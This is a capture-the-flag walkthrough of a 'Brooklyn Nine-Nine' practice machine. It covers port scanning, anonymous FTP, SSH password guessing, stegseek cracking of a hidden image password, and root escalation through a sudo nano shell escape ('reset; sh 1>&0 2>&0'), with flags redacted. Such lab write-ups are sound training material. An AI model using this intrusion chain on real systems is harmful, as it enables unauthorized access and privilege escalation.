Brooklyn Nine-Nine CTF Walkthrough
🔍 Phase 1: Reconnaissance

Step 1: Nmap Scan

First, I started with an Nmap scan to see what ports are open:
bash

nmap -sV -Pn 10.49.163.41

Results:
text

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Apache httpd 2.4.29

Nice! Three ports open: FTP, SSH, and HTTP.
Step 2: Web Enumeration

While Nmap was running, I launched Gobuster to enumerate web directories:
bash

gobuster dir -u http://10.49.163.41 -w /usr/share/wordlists/seclist/DNS/common.txt

But honestly, nothing interesting popped up here. Time to check the other services.
📁 Phase 2: FTP Investigation
Step 3: Anonymous FTP Login

FTP port 21 is open, and vsftpd often allows anonymous login. Let's try:
bash

ftp 10.49.163.41

When prompted:
text

Username: anonymous
Password: [Just press Enter - leave it blank]

Success! We're in with anonymous access.
Step 4: Exploring FTP

Let's see what's in here:
bash

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 Jul 16  2020 note_to_jake.txt
226 Directory send OK.

Interesting! There's a file called note_to_jake.txt. Let's download it:
bash

ftp> get note_to_jake.txt
ftp> exit

Now let's read it:
bash

cat note_to_jake.txt

Content:
text

From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

Ooh! This is gold! We now know:

    There's a user named Jake

    His password is weak

    There's someone named Holt who's an admin

🔐 Phase 3: Initial Access Attempts
Step 5: Trying SSH with Jake

Let's try to SSH with Jake and some common weak passwords:
bash

ssh jake@10.49.163.41

Tried passwords: password, admin, 123456, jake, password123... nothing worked. Either the password isn't that common, or maybe Jake isn't the right user to target.
🌐 Phase 4: Web Investigation
Step 6: Checking the Website

Let's visit http://10.49.163.41 in the browser. It's a simple Brooklyn Nine-Nine fan page.

Pro Tip: Always check the source code! Right-click → View Page Source.

Found this comment in the HTML:
html

<!-- Have you ever heard of steganography? -->

Bingo! Steganography hint! There's probably something hidden in an image on the site.
Step 7: Finding the Image

Looking at the page, there's a main image brooklyn99.jpg. Let's download it:
bash

wget http://10.49.163.41/brooklyn99.jpg

🖼️ Phase 5: Steganography Analysis
Step 8: Checking for Hidden Data

First, let's see if there's actually something hidden:
bash

steghide info brooklyn99.jpg

Output asks for a password. So there IS hidden data, but we need a password.
Step 9: Cracking the Password

Stegseek is lightning fast for this:
bash

stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt

Almost immediately:
text

[!] Found passphrase: "admin"
[i] Extracting to "brooklyn99.jpg.out"

Wow! The password was just admin!
Step 10: Extracting the Hidden File

Now we can use steghide properly:
bash

steghide extract -sf brooklyn99.jpg

When prompted for password, enter: admin

Output:
text

wrote extracted data to "note.txt".

Step 11: Reading the Note
bash

cat note.txt

Contents:
text

holt password:
{redacted_password_here}

Jackpot! We have Holt's password!
🚪 Phase 6: Gaining Access
Step 12: SSH as Holt
bash

ssh holt@10.49.163.41

Enter the password from note.txt, and... we're in!
Step 13: First Flag - User Flag
bash

ls

We see user.txt. Let's grab it:
bash

cat user.txt

User Flag: {redacted_user_flag} ✅
⬆️ Phase 7: Privilege Escalation
Step 14: Checking Sudo Privileges

Always check what you can run as sudo:
bash

sudo -l

Output:
text

User holt may run the following commands on brooklyn99:
    (ALL) NOPASSWD: /bin/nano

Interesting! We can run nano as root without a password!
Step 15: Researching Nano Exploit

Quick Google search: "nano sudo privilege escalation" or check GTFOBins:

From GTFOBins:
text

If the binary is allowed to run as superuser by sudo, 
it does not drop the elevated privileges and may be used 
to access the file system, escalate or maintain privileged access.

Method:

    Run sudo nano

    Press Ctrl+R then Ctrl+X

    Enter command to spawn shell

Step 16: Executing the Exploit
bash

sudo nano

This opens the nano editor. Now:

    Press Ctrl+R (load file)

    Press Ctrl+X (command prompt)

    Type: reset; sh 1>&0 2>&0

    Press Enter

We now have a root shell! Let's verify:
bash

whoami
 ***Output: root***



Step 17: Final Flag - Root Flag
bash

cd /root
ls
cat root.txt

Root Flag: {redacted_root_flag} ✅




